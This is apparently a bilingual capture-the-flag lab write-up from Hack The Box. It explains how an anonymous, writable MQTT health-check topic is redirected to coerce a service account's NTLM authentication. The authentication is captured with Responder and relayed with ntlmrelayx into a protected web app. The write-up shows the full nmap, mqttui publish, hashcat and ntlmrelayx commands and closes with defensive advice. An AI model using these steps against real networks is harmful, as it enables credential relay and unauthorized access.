---
title: 'NTLM relay in de praktijk: via een messaging-service inloggen op een afgeschermde site'
title_en: 'NTLM relay in practice: logging into a locked-down site through a messaging service'
description: Een volledig uitgewerkt NTLM-relay-verhaal. Hoe een onschuldige healthcheck in een messaging-service een service-account zover krijgt dat het zich bij míj aanmeldt, waarom die hash niet te kraken is, en hoe ik die aanmelding doorsluis om op een afgeschermde webapp te komen, zonder het wachtwoord ooit te zien.
description_en: A fully worked NTLM relay story. How an innocent health check in a messaging service makes a service account authenticate to me, why that hash can't be cracked, and how I relay that authentication to land inside a locked-down web app, without ever seeing the password.
date: 2026-10-29
category:
  - Active Directory
tags:
  - active-directory
  - ntlm
  - ntlm-relay
  - mqtt
  - nmap
  - responder
  - impacket
  - windows
ogImage: /media/writeups/nr-og-cover.png
readingTime: 20 min
pinned: false
draft: false
---

<svg width="0" height="0" aria-hidden="true" focusable="false" style="position:absolute">
<defs>
<marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
<marker id="aha" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" style="fill:var(--accent)"/></marker>
</defs>
</svg>

<div data-lang-block="nl">

> **⚠ Lab & autorisatie.** Dit speelde zich af in een afgeschermde lab-omgeving binnen Hack The Box, waar je legaal en met toestemming mag aanvallen. Alle "gebruikers", services en hosts hieronder zijn gesimuleerd en bedoeld om op te oefenen. Dezelfde technieken loslaten op een echt netwerk zonder uitdrukkelijke, schriftelijke opdracht is strafbaar. Ik schrijf dit bewust mét de verdediging erbij: de blue-team-sectie onderaan hoort er net zo goed bij als de aanval.

> **◆ TL;DR.** Een systeem draait een open **messaging-service** (MQTT) die een "healthcheck" bijhoudt: een URL die periodiek zelf wordt opgehaald om te controleren of een afgeschermde webapp nog leeft. Ik verander die URL zo dat het systeem een verbinding naar **mijn machine** opzet. Daardoor stuurt een **service-account** mij zijn NTLM-aanmelding. Die hash blijkt niet te kraken, maar dat hoeft ook niet: ik **relay** de aanmelding live door naar de webapp. De app denkt dat ík het service-account ben en laat me binnen, terwijl ik het wachtwoord nooit heb gezien.

Dit is geen stap-voor-stap-oplossing van een puzzel, maar een poging om de **les** eruit te halen: hoe herken je een NTLM-relay-situatie, en hoe handel je dan? Ik leg elke term, tool en protocol onderweg uit, met diagrammen waar dat sneller werkt dan woorden.

## 00 · Enumeratie: eerst álle poorten, dan pas gericht

Enumeratie is de fundering. Ik doe het bewust in lagen, en dat is een gewoonte die op elke machine loont. Mijn eerste scan heeft maar één doel: **zo snel mogelijk ontdekken welke poorten open staan**, zonder tijd te verspillen aan details.

```
$ sudo nmap -sS -p- 10.129.86.15 -T5
```

- **`-sS`** is een *SYN-scan* ("half-open"): nmap stuurt het eerste pakketje van de TCP-handdruk (SYN) en concludeert uit het antwoord of de poort open is, zonder de verbinding af te maken. Snel en relatief stil.
- **`-p-`** scant **alle 65535 TCP-poorten**, niet alleen de bekende top-1000. Je wilt niks missen.
- **`-T5`** is de snelste timing. In het echt is `-T5` meestal **te agressief** (je mist resultaten en je bent luid), maar dit is een afgeschermd lab en ik wil snelheid, dus hier mag het.

Waarom niet meteen alles-in-één? Omdat version-detectie en scripts (hieronder) **per poort** tijd kosten. Die op alle 65535 poorten loslaten duurt eindeloos. Dus: eerst een snelle scan om de open poorten te vínden, en pas dáárop de zware scans. Met die lijst doe ik de gerichte scan:

```
$ sudo nmap -A -p53,80,88,135,139,389,445,464,593,636,1883,2179,3268,5985,9389,49664,49674,49675,49677,49678,49894,49907,49924 10.129.86.15 -T5 -oG target
```

- **`-A`** is de "alles"-knop: *version detection* (`-sV`, welke software en versie draait er), *default scripts* (`-sC`, nmap's NSE-scripts die extra info uit een service trekken), *OS-detectie* en *traceroute*. Dit is de dure scan, daarom beperk ik 'm met `-p` tot alleen de poorten die de eerste scan vond.
- **`-oG target`** schrijft *grepable output* naar een bestand, handig om later met `grep` op te zoeken.

En voor de zekerheid draaide ik op de achtergrond nog een UDP-scan. UDP wordt vaak vergeten, maar services als DNS, SNMP en soms een broker luisteren op UDP:

```
$ nmap -sU -sV -sC -n -F -T4 10.129.86.15
```

- **`-sU`** scant UDP in plaats van TCP. UDP-scans zijn **traag** (geen handdruk om op te leunen), dus knijp ik 'm af met **`-F`** (*fast*: alleen de top-100-poorten) en **`-n`** (geen DNS-lookups, scheelt tijd).

Uit de gerichte scan komt het klassieke skelet van een **Windows-domeincontroller** tevoorschijn. Ik toon hier alleen de poorten die voor dít verhaal tellen; er stonden er meer open (`<SNIP>`):

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Ghost Protocol Zero
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb)
445/tcp   open  microsoft-ds
<SNIP>
1883/tcp  open  mqtt                          <-- hoort hier niet standaard
<SNIP>
5985/tcp  open  http          Microsoft HTTPAPI 2.0 (WinRM)

Host script results:
| smb2-security-mode:
|_  Message signing enabled and required      <-- onthoud deze regel
```

DNS (53), Kerberos (88), LDAP (389), SMB (445), WinRM (5985): dat is standaard-AD. Twee dingen markeer ik nu al, ze komen later terug:

1. **Poort 1883 (MQTT)** hoort niet in dat standaard-rijtje. Een afwijking als deze is op een pentest vaak dé ingang: iemand heeft het er bewust bij gezet.
2. **`smb2-security-mode: Message signing enabled and required`.** Die regel vertelt dat SMB *message signing* afdwingt. Waarom dat straks belangrijk is, leg ik uit bij de relay.

De webserver op poort 80 is een saaie landingspagina zonder verborgen mappen. Dus we duiken in MQTT.

## 01 · De vreemde eend: de messaging-service (MQTT)

### Wat is MQTT?

**MQTT** (Message Queuing Telemetry Transport) is een licht berichtenprotocol, oorspronkelijk voor IoT: sensoren, slimme lampen, trackers. In plaats van dat apparaten rechtstreeks met elkaar praten, loopt alles via één centrale tussenpersoon. Het model heet **publish/subscribe**:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 250" role="img" aria-labelledby="mqtt-nl" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="mqtt-nl">MQTT publish/subscribe-model</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="36" y="38" width="168" height="48" rx="6"/>
<rect x="36" y="150" width="168" height="48" rx="6"/>
<rect x="516" y="96" width="168" height="48" rx="6"/>
</g>
<g style="fill:var(--accent-weak);stroke:var(--accent)">
<rect x="296" y="90" width="150" height="60" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="120" y="60" font-weight="700">Publisher</text>
<text x="120" y="76">sensor / node</text>
<text x="120" y="172" font-weight="700">Publisher</text>
<text x="120" y="188">healthcheck-proces</text>
<text x="371" y="116" font-weight="700" style="fill:var(--accent)">BROKER</text>
<text x="371" y="134" style="fill:var(--accent)">poort 1883</text>
<text x="600" y="118" font-weight="700">Subscriber</text>
<text x="600" y="134">wij</text>
</g>
<g style="stroke:currentColor;fill:currentColor" text-anchor="middle" font-size="11">
<line x1="204" y1="66" x2="292" y2="104" marker-end="url(#ah)"/>
<line x1="204" y1="174" x2="292" y2="138" marker-end="url(#ah)"/>
<text x="235" y="150">publish</text>
<line x1="446" y1="120" x2="512" y2="120" marker-end="url(#ah)"/>
<text x="480" y="110">levert af</text>
</g>
<text x="371" y="196" text-anchor="middle" font-size="11" style="fill:var(--muted)">bewaart het laatste "retained" bericht per topic</text>
</svg>
</figure>

_Publishers en subscribers kennen elkaar niet; ze praten alleen met de broker. Berichten worden gegroepeerd in **topics** (een pad met `/`, zoals `systems/node/secureshare/healthcheck`). Een subscriber kiest op welke topics hij luistert; met het wildcard **`#`** vraag je in één keer álle topics op._

Eén detail is cruciaal: een publisher kan een bericht als **retained** markeren. De broker bewaart dan het laatste bericht per topic en stuurt dat meteen naar elke nieuwe subscriber. Statische info (status, configuratie, soms credentials) blijft zo hangen.

Twee eigenschappen maken MQTT hier interessant. Ten eerste staat de broker vaak **anoniem** open (geen login), omdat IoT-spul simpel moet blijven. Ten tweede is MQTT **twee-richtingsverkeer**: je kunt niet alleen lezen (subscribe), je kunt ook **schrijven** (publish). Dat tweede punt is de kern van de hele aanval.

Ik pak een MQTT-client (`mqttui`) en abonneer me op alles (`#`):

```
$ ./mqttui -b mqtt://ghostlink.htb
```

De broker blijkt een statusdashboard voor "nodes". Tussen de berichten staan twee interne hostnamen die ik nog niet kende:

```
gpz-op26-secure.ghostlink.htb    -> een afgeschermde file-sharing app (vereist login)
gpz-op26-toolkits.ghostlink.htb  -> een Gogs code-host (git)
```

## 02 · Een healthcheck naar een site waar ik niet in kan

Browsen naar de eerste host, `gpz-op26-secure`, loopt meteen vast op een harde loginprompt:

![De afgeschermde webapp weigert toegang zonder geldige aanmelding](/media/writeups/nr-secure-login.png)

_Zonder credentials kom je er niet in: "Access is denied due to invalid credentials". Dit is precies het soort muur waar je als aanvaller op stuit, en waar de rest van dit verhaal om draait._

Wat voor slot zit er op die deur? Dat vraag ik de app gewoon zelf, met een `curl -I` (haalt alleen de HTTP-headers op, niet de body):

```
$ curl -I http://gpz-op26-secure.ghostlink.htb/
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/10.0
WWW-Authenticate: NTLM
```

De `WWW-Authenticate: NTLM`-header is het antwoord: de app verwacht **NTLM-authenticatie**. Dat is meteen interessant, want NTLM is precies het soort aanmelding dat je kunt *uitlokken* en *doorsluizen*. Maar dat vertelt me alleen dat de *server* NTLM aanbiedt. De vraag die overblijft: wie beschikt eigenlijk over geldige NTLM-credentials voor deze app? Terug naar MQTT.

Tussen de MQTT-topics zit er nu één die alles verraadt. Ik lees 'm uit:

```
$ ./mqttui -b mqtt://ghostlink.htb r "GhostProtocolZero/systems/node/secureshare/healthcheck"

{"timestamp":"2026-27-04-15:45:45","node":"node-6","telemetry":{
  "healthy":true,
  "url":"gpz-op26-secure.ghostlink.htb/healthcheck",
  "lastCheckSecAgo":30,
  "responseCode":"200",
  "ip":"172.16.20.10"}}
```

Lees dit bericht goed. Er staat een **`url`** in, met `responseCode: 200` en "30 seconden geleden gecheckt". Dus: ergens op het netwerk draait een proces dat deze URL **periodiek zelf ophaalt** om te controleren of de afgeschermde app nog leeft, en de uitkomst (200 = OK) terugschrijft naar MQTT.

Zie je de spanning? Ík krijg een harde `401` op die app. Maar dit healthcheck-proces krijgt gewoon een **200**. En we weten net van `curl` dat die app NTLM wil. Dus dit proces beschikt over geldige **NTLM-credentials** die ik niet heb. Dáár zitten de inloggegevens. Twee vragen dringen zich op:

1. Kan ik dat healthcheck-proces zover krijgen dat het zijn NTLM-aanmelding naar **mij** stuurt in plaats van naar de app?
2. En zo ja, wat kan ik met die aanmelding?

En hier komt de MQTT-eigenschap van zonet terug: dit bericht is **schrijfbaar**. Ik kan de `url` veranderen in een adres dat naar *mijn* machine wijst. Dan haalt het healthcheck-proces straks *mijn* server op, mét de aanmelding die het normaal naar de app stuurt. Zo verleg ik de authenticatie van de app naar mijzelf, en kan ik zien hóe die eruitziet.

## 03 · De bron omdraaien: Responder + de topic kapen

Om te zien wie er langskomt en met welke aanmelding, zet ik een "vangnet" op mijn eigen machine neer: **Responder**.

### Wat is Responder eigenlijk?

De meeste uitleg stopt bij "Responder vangt hashes op", maar dat verbergt wat de tool écht doet. Responder heeft **twee taken**:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 270" role="img" aria-labelledby="resp-nl" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="resp-nl">Hoe Responder werkt: vergiftigen en opvangen</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="40" y="14" width="170" height="44" rx="6"/>
<rect x="510" y="14" width="170" height="44" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="125" y="34" font-weight="700">Slachtoffer</text>
<text x="125" y="49">Windows-host</text>
<text x="595" y="34" font-weight="700" style="fill:var(--accent)">Responder</text>
<text x="595" y="49">mijn machine</text>
</g>
<g style="stroke:currentColor" stroke-dasharray="3 4" opacity="0.35">
<line x1="125" y1="58" x2="125" y2="235"/>
<line x1="595" y1="58" x2="595" y2="235"/>
</g>
<g style="stroke:currentColor;fill:currentColor" text-anchor="middle" font-size="11">
<line x1="125" y1="92" x2="591" y2="92" marker-end="url(#ah)"/>
<text x="360" y="85">1 · broadcast: "wie is FILESRV?" (LLMNR / NBT-NS / mDNS)</text>
<line x1="595" y1="132" x2="129" y2="132" marker-end="url(#ah)"/>
<text x="360" y="125">2 · "dat ben ik → 10.10.14.2" (vergiftiging)</text>
<line x1="125" y1="172" x2="591" y2="172" marker-end="url(#ah)"/>
<text x="360" y="165">3 · verbindt &amp; authenticeert (SMB / HTTP / ...)</text>
</g>
<g style="fill:var(--accent-weak);stroke:var(--accent)">
<rect x="470" y="192" width="210" height="40" rx="6"/>
</g>
<text x="575" y="216" text-anchor="middle" font-size="11" style="fill:currentColor" font-weight="700">4 · NTLMv2-hash gelogd</text>
</svg>
</figure>

1. **Vergiftigen (poisoning).** Als een Windows-machine een naam niet via DNS kan vinden, valt hij terug op oude broadcast-protocollen (**LLMNR**, **NBT-NS**, **mDNS**) en roept het hele subnet toe: "wie kent FILESRV?" Responder antwoordt op *elke* zo'n vraag "dat ben ik!" en stuurt zijn eigen IP. Het slachtoffer verbindt daardoor met de aanvaller in plaats van met de echte server.
2. **Uitdagen en opvangen (capturing).** Responder draait tegelijk een rits **nep-servers** (SMB, HTTP, HTTPS, FTP, LDAP, SQL...). En die vangen niet *passief* af, ze **dagen actief uit**: zodra er een verzoek binnenkomt, antwoordt de nep-HTTP-server met een `401 Unauthorized` + de header `WWW-Authenticate: NTLM`, oftewel "je mag er niet in, authenticeer je eerst met NTLM". Een client die ingesteld is op Windows integrated authentication hapt daar automatisch op toe en stuurt zijn **NTLMv2-response**, en díé logt Responder.

Dus nee, Responder draait niet puur om NTLM, het draait net zo goed om het *vergiftigen van naamopvraging* om slachtoffers naar je toe te lokken. In **ons** geval hebben we die vergiftiging niet nodig: de MQTT-healthcheck doet het lokken al voor ons (stap 1-2). Wij gebruiken alleen Responders nep-**HTTP-server** om de binnenkomende healthcheck uit te dagen voor NTLM en de response op te vangen (stap 3-4).

Ik start Responder op mijn VPN-interface:

```
$ sudo responder -I tun0 -v
[+] Servers:
    HTTP server    [ON]
    HTTPS server   [ON]
```

Nu draai ik de healthcheck-URL om. Ik maak een nieuw JSON-bericht waarin de `url` naar mijn eigen IP (`10.10.14.2`) wijst, en **publish** dat terug naar hetzelfde topic. De **`-r`** (retain) zorgt dat de broker het als het nieuwe "laatst bekende" bericht bewaart, zodat het healthcheck-proces het zeker oppikt:

```
$ j='{"timestamp":"2026-03-03-09:26:21","node":"node-6","telemetry":{
      "healthy":true,"url":"http://10.10.14.2",
      "lastCheckSecAgo":45,"responseCode":"200","ip":"172.16.20.10"}}'

$ ./mqttui -b mqtt://ghostlink.htb publish -r \
    "GhostProtocolZero/systems/node/secureshare/healthcheck" "$j"
```

Een paar seconden later verschijnt er in Responder een aanmelding, en het is geen gewone gebruiker maar een **service-account**:

![Responder vangt NTLMv2-aanmelding van svc_canary](/media/writeups/nr-responder-capture.png)

Raak. Responders nep-server daagde de binnenkomende healthcheck uit met een NTLM-`401`, en het proces hapte toe: het authenticeerde automatisch, onder het account `svc_canary`. Dat bevestigt niet alleen wat `curl -I` al suggereerde (de app wíl NTLM), maar beantwoordt ook mijn eerste vraag: het healthcheck-proces stuurt zijn NTLM-aanmelding klakkeloos naar elke URL die ik opgeef, mét echte domein-credentials. Nu heb ik die aanmelding in handen.

## 04 · Kraken? De juiste eerste zet, die hier stukliep

Wat Responder opving heet een **NTLMv2-response** (ook wel "Net-NTLMv2"). Het is níét het wachtwoord, en ook niet de vaste NT-hash van het account. Het is het **antwoord op één specifieke challenge**: het account heeft een willekeurig getal van de server versleuteld met een afgeleide van zijn wachtwoord.

De standaard eerste zet is dan ook: **proberen te kraken**. En dat is een verstandige zet, geen domme. `hashcat` (mode 5600) raadt kandidaat-wachtwoorden, rekent voor elk uit wat de NTLMv2-response zóu zijn, en vergelijkt. Klopt het? Dan heb je het **plaintext-wachtwoord** teruggevonden. Bij een zwak wachtwoord is dit in seconden klaar.

```
$ hashcat -m 5600 svc_canary.hash rockyou.txt
```

Maar hier gebeurt er niets. Dat is logisch: `svc_canary` is een **service-account**, en die hebben doorgaans een lang, willekeurig wachtwoord dat in geen enkele woordenlijst staat. Kraken was de juiste reflex; hij liep alleen stuk op een te sterk wachtwoord.

En precies hier zit de denkfout die beginners (ik dus ook) soms maken: *harder* gaan kraken. De uitweg is juist **niet kraken**. Want ik heb dat wachtwoord helemaal niet nodig. Ik heb al iets veel waardevollers in handen: een **levende aanmelding** die binnenkomt op het moment dat ik dat wil. Die kan ik doorsluizen. Tijd voor de relay.

## 05 · Hoe NTLM werkt, en waarom je het kunt relayen

### NTLM in het normale geval

**NTLM** is een oud authenticatieprotocol van Microsoft. Het werkt met een **challenge-response**-handdruk in drie stappen, en het wachtwoord gaat nooit over de lijn:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 180" role="img" aria-labelledby="ntlm-nl" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="ntlm-nl">Normale NTLM-handdruk</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="60" y="14" width="150" height="40" rx="6"/>
<rect x="510" y="14" width="150" height="40" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="135" y="39" font-weight="700">Client</text>
<text x="585" y="39" font-weight="700">Server</text>
</g>
<g style="stroke:currentColor" stroke-dasharray="3 4" opacity="0.35">
<line x1="135" y1="54" x2="135" y2="160"/>
<line x1="585" y1="54" x2="585" y2="160"/>
</g>
<g style="stroke:currentColor;fill:currentColor" text-anchor="middle" font-size="11">
<line x1="135" y1="82" x2="581" y2="82" marker-end="url(#ah)"/>
<text x="360" y="75">1 · Negotiate — "ik wil inloggen"</text>
<line x1="585" y1="116" x2="139" y2="116" marker-end="url(#ah)"/>
<text x="360" y="109">2 · Challenge — willekeurig getal (de puzzel)</text>
<line x1="135" y1="150" x2="581" y2="150" marker-end="url(#ah)"/>
<text x="360" y="143">3 · Response — puzzel versleuteld met wachtwoord-hash</text>
</g>
</svg>
</figure>

De server (of de domeincontroller erachter) controleert of de response bij de challenge past. Slim bedacht: je bewijst dat je het wachtwoord kent, zónder het te sturen.

Maar er zit een fatale aanname in. **De server controleert alleen of het antwoord bij de challenge klopt, niet wíe het antwoord aanlevert.** Het protocol bindt de aanmelding niet aan het kanaal waarover hij binnenkomt. En dat is het hele lek.

### De relay: man-in-the-middle op de handdruk

Bij een **NTLM relay** kraak ik niets. Ik ga precies tussen slachtoffer en doelserver in zitten en geef de puzzelstukjes door. Ik hoef de puzzel niet te kúnnen oplossen, want het slachtoffer lost 'm voor mij op:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 390" role="img" aria-labelledby="relay-nl" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="relay-nl">NTLM-relay-sequentie</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="40" y="12" width="160" height="40" rx="6"/>
<rect x="280" y="12" width="160" height="40" rx="6"/>
<rect x="520" y="12" width="160" height="40" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="120" y="30" font-weight="700">Slachtoffer</text>
<text x="120" y="45">svc_canary</text>
<text x="360" y="30" font-weight="700" style="fill:var(--accent)">Aanvaller</text>
<text x="360" y="45">mijn machine</text>
<text x="600" y="30" font-weight="700">Doelserver</text>
<text x="600" y="45">de webapp</text>
</g>
<g style="stroke:currentColor" stroke-dasharray="3 4" opacity="0.35">
<line x1="120" y1="52" x2="120" y2="360"/>
<line x1="360" y1="52" x2="360" y2="360"/>
<line x1="600" y1="52" x2="600" y2="360"/>
</g>
<g style="stroke:currentColor;fill:currentColor" font-size="11" text-anchor="middle">
<line x1="120" y1="90" x2="356" y2="90" marker-end="url(#ah)"/>
<text x="238" y="83">1 · Negotiate</text>
<line x1="360" y1="130" x2="596" y2="130" marker-end="url(#ah)"/>
<text x="480" y="123">2 · doorgestuurd</text>
<line x1="600" y1="170" x2="364" y2="170" marker-end="url(#ah)"/>
<text x="480" y="163">3 · Challenge</text>
<line x1="360" y1="210" x2="124" y2="210" marker-end="url(#ah)"/>
<text x="238" y="203">4 · doorgestuurd</text>
<line x1="120" y1="250" x2="356" y2="250" marker-end="url(#ah)"/>
<text x="238" y="243">5 · Response</text>
</g>
<g style="stroke:var(--accent)" font-size="11" text-anchor="middle">
<line x1="360" y1="290" x2="596" y2="290" marker-end="url(#aha)"/>
</g>
<text x="480" y="283" text-anchor="middle" font-size="11" style="fill:var(--accent)">6 · doorgestuurd</text>
<g style="fill:var(--accent-weak);stroke:var(--accent)">
<rect x="470" y="314" width="210" height="44" rx="6"/>
</g>
<text x="575" y="333" text-anchor="middle" font-size="11" style="fill:currentColor" font-weight="700">ingelogd als</text>
<text x="575" y="349" text-anchor="middle" font-size="11" style="fill:currentColor">svc_canary</text>
</svg>
</figure>

_Stappen 3→4 en 5→6 zijn pure doorgeefluiken: de challenge van de doelserver gaat naar het slachtoffer, en het antwoord van het slachtoffer gaat terug naar de doelserver. Die accepteert het en denkt dat de aanvaller svc_canary is._

### Waarom HTTP en niet SMB? (de signing-regel)

Twee voorwaarden maken een relay mogelijk, en ze zijn tegelijk de verdediging:

1. **Je moet het slachtoffer zover krijgen dat het naar jóu authenticeert.** Dat deden we al via de MQTT-healthcheck.
2. **Het doelprotocol mag geen handtekening (signing) of channel binding afdwingen.** Signing bindt de aanmelding wiskundig aan precies dát kanaal; een doorgesluisde aanmelding klopt dan niet meer en wordt geweigerd.

Hoe weet je vooraf waar je wél en niet naartoe kunt relayen? Dat lees je deels gewoon af uit je nmap-scan. Weet je nog die regel die ik je liet onthouden?

```
| smb2-security-mode:
|_  Message signing enabled and required
```

SMB dwingt hier signing **af**. Relayen naar SMB is dus kansloos, dat is bij een domeincontroller trouwens standaard zo. Maar ik wíl ook helemaal niet naar SMB: mijn buit is de **HTTP-webapp**, en de uitgelokte aanmelding komt óók over HTTP binnen. HTTP dwingt channel binding (de tegenhanger van signing, **EPA**, *Extended Protection for Authentication*) standaard níét af, tenzij een beheerder het expliciet aanzet. Dus HTTP → HTTP is het natuurlijke doel. Als de webapp wél EPA had afgedwongen, zou deze hele aanval hier doodlopen.

## 06 · De relay uitvoeren met ntlmrelayx

Responder *vangt* aanmeldingen op. Voor *doorsluizen* pak ik **`ntlmrelayx`** uit de **Impacket**-suite (een verzameling Python-tools voor Windows-netwerkprotocollen).

### Wat doet ntlmrelayx precies?

`ntlmrelayx` neemt een binnenkomende aanmelding en speelt die live door naar een doel dat jíj kiest, over een protocol dat jíj kiest. Wat het daarna met die geauthenticeerde sessie doet, is waar de kracht zit:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 280" role="img" aria-labelledby="relayx-nl" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="relayx-nl">ntlmrelayx: van aanmelding naar actie</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="24" y="110" width="160" height="60" rx="6"/>
<rect x="450" y="30" width="260" height="56" rx="6"/>
<rect x="450" y="110" width="260" height="42" rx="6"/>
<rect x="450" y="196" width="260" height="56" rx="6"/>
</g>
<g style="fill:var(--accent-weak);stroke:var(--accent)">
<rect x="230" y="108" width="190" height="64" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="104" y="136" font-weight="700">Uitgelokte</text>
<text x="104" y="152">NTLM-aanmelding</text>
<text x="325" y="136" font-weight="700" style="fill:var(--accent)">ntlmrelayx</text>
<text x="325" y="152" style="fill:var(--accent)">kiest doel + protocol</text>
<text x="580" y="52" font-weight="700">Eenmalige actie</text>
<text x="580" y="70">dump SAM / LDAP / ADCS</text>
<text x="580" y="135" font-weight="700">-socks → SOCKS-proxy</text>
<text x="580" y="222" font-weight="700">Browser / Burp</text>
<text x="580" y="240">interactief, als het slachtoffer</text>
</g>
<g style="stroke:currentColor;fill:currentColor" text-anchor="middle" font-size="11">
<line x1="184" y1="140" x2="226" y2="140" marker-end="url(#ah)"/>
<line x1="420" y1="134" x2="446" y2="70" marker-end="url(#ah)"/>
<line x1="420" y1="150" x2="446" y2="130" marker-end="url(#ah)"/>
<line x1="580" y1="152" x2="580" y2="192" marker-end="url(#ah)"/>
</g>
</svg>
</figure>

_Je kunt het relayen naar SMB, LDAP, HTTP, MSSQL en meer, en er meteen een actie op loslaten (hashes dumpen, een computeraccount aanmaken, een ADCS-certificaat aanvragen). Of, en dat doen we hier: je houdt de sessie open achter een **SOCKS-proxy**, zodat je er met een gewone browser interactief doorheen kunt._

Ik richt de relay op de webapp over HTTP, en zet de inkomende HTTP-poort op `8888` zodat ik geen root nodig heb voor lage poorten:

```
$ ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb \
    --http-port 8888 --no-smb-server --keep-relaying
```

Dan publiceer ik de omgedraaide healthcheck nog eens naar MQTT (nu wijzend naar mijn relay in plaats van naar Responder). Zodra het healthcheck-proces weer langskomt:

<img src="/media/writeups/nr-relay-succeed.png" alt="ntlmrelayx slaagt: SUCCEED" style="width:100%" />

**SUCCEED.** De webapp heeft svc_canary geaccepteerd, via mij. Ik heb nu een geauthenticeerde sessie op een app waar ik het wachtwoord nooit van wist.

### Eén relay is niet genoeg: de SOCKS-proxy

Standaard haalt `ntlmrelayx` alleen de voorpagina op en is dan klaar. Ik wil niet één pagina, ik wil **rondklikken**: downloads proberen, API-calls doen. Daarvoor voeg ik **`-socks`** toe:

```
$ ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb \
    --http-port 8888 --no-smb-server --keep-relaying -socks
...
[*] SOCKS: Adding HTTP://GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy
```

`ntlmrelayx` houdt de geauthenticeerde sessie nu **open** en zet er een **SOCKS-proxy** voor open op mijn machine. Een SOCKS-proxy is een doorgeefloket: alles wat ik erdoorheen stuur, komt er uit als de geauthenticeerde svc_canary-sessie. Ik hoef de aanmelding dus niet steeds opnieuw uit te lokken, ik hergebruik die ene geslaagde relay zo vaak als ik wil. Ik wijs mijn browser (of Burp/Caido) naar de proxy:

```
[proxychains] via SOCKS 127.0.0.1:1080  ->  gpz-op26-secure.ghostlink.htb
```

En ik sta middenin de "secure file sharing"-app, ingelogd, zonder ooit een wachtwoord te hebben geraden of gekraakt.

![De secure file sharing-app, ingelogd als svc_canary via de relay](/media/writeups/nr-secure-filesharing.png)

## 07 · Blue team: waar breekt deze aanval?

Een aanval begrijpen betekent weten waar je 'm stopt. Deze keten had op vier plekken kunnen afketsen:

- **Geen anonieme messaging-broker.** Alles begint bij een broker die lezen én schrijven toestaat zonder authenticatie. Zet login aan, gebruik TLS (poort 8883) zodat berichten niet in plaintext over de lijn gaan, en zet 'm niet aan de buitenkant.
- **Vertrouw geen URL uit een bericht dat je zelf niet gezet hebt.** Het healthcheck-proces haalde blind een door een aanvaller aanpasbare URL op. Een allowlist van toegestane healthcheck-bestemmingen maakt de coercion onmogelijk.
- **Dwing signing / channel binding af.** NTLM relay werkt alleen omdat de aanmelding niet aan het kanaal gebonden is. SMB-signing was hier al verplicht; **EPA** op de HTTP-webapp had hetzelfde gedaan voor HTTP.
- **Zet NTLM uit waar het kan en monitor de rest.** Microsoft beschouwt NTLM als legacy; Kerberos is niet op deze manier te relayen. En een NTLM-aanmelding van een service-account vanaf een onverwachte bron is precies het signaal dat hier had moeten afgaan.

## 08 · De les

De kern die ik meeneem naar elke volgende machine:

1. **Enumereer in lagen.** Eerst snel alle poorten vinden, dan pas gericht de zware scans. Een afwijkende poort (hier MQTT op 1883) is vaak de ingang.
2. **Een opgevangen NTLMv2-response kraken is de juiste eerste zet**, geen domme, want bij een zwak wachtwoord krijg je het plaintext terug. Lukt dat niet (typisch bij een sterk service-account-wachtwoord), dan is dat geen doodlopende weg maar een **signaal**: stop met kraken en denk aan relayen.
3. **Relayen draait om twee dingen:** een manier om een account naar jou te laten authenticeren (hier een schrijfbare healthcheck; elders vaak een printer-bug, een share-link of een geplande check), en een doel dat **geen signing / EPA** afdwingt. Je nmap-scan vertelt je al deels waar dat kan. Het wachtwoord doet er dan niet meer toe.

</div>

<div data-lang-block="en">

> **⚠ Lab & authorization.** This took place in a walled-off lab environment inside Hack The Box, where you may legally and with permission attack. Every "user", service and host below is simulated and meant for practice. Running these techniques against a real network without explicit, written authorization is a crime. I deliberately include the defence: the blue-team section at the end is as much a part of this as the attack.

> **◆ TL;DR.** A system runs an open **messaging service** (MQTT) that tracks a "health check": a URL fetched periodically to verify a locked-down web app is still alive. I rewrite that URL so the system opens a connection to **my machine**. That makes a **service account** send me its NTLM authentication. The hash turns out to be uncrackable, but it doesn't need to be: I **relay** the authentication live to the web app. The app thinks I am the service account and lets me in, while I never saw the password.

This isn't a step-by-step solution to a puzzle, but an attempt to extract the **lesson**: how do you recognise an NTLM relay situation, and how do you act then? I explain every term, tool and protocol along the way, with diagrams where they're faster than words.

## 00 · Enumeration: all ports first, targeted scans after

Enumeration is the foundation. I deliberately do it in layers, a habit that pays off on every machine. My first scan has a single goal: **find out which ports are open as fast as possible**, without wasting time on detail.

```
$ sudo nmap -sS -p- 10.129.86.15 -T5
```

